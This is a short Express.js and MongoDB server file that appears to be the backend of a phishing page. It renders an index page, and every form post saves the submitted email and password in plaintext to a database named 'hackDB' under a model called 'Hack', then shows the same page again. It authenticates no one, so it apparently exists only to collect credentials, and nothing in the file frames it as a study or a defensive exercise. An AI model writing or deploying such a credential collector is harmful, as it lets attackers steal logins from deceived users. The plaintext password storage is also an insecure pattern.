const express = require('express');
const ejs = require('ejs');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');



const port = process.env.port || 3000;
const app = express();

mongoose.connect('mongodb://localhost:27017/hackDB', {useNewUrlParser: true});

app.use(express.static('public'));
app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({extended: true}));


const hackSchema = {
    email: {
        type: String,
        required: true
    },
    password: {
        type: String,
        required: true
    }
}

const Hack = new mongoose.model('Hack', hackSchema);



app.get('/', (req,res)=>{
    res.render('index');
});


app.post('/', (req,res)=>{
    const newUser = new Hack({
        email: req.body.username,
        password: req.body.password
    });

    newUser.save(function(err){
        if(err){
            console.log(err);
        }else{
            res.render('index')
        }
    });
});

app.listen(port, ()=>{
    console.log('app is connected');
});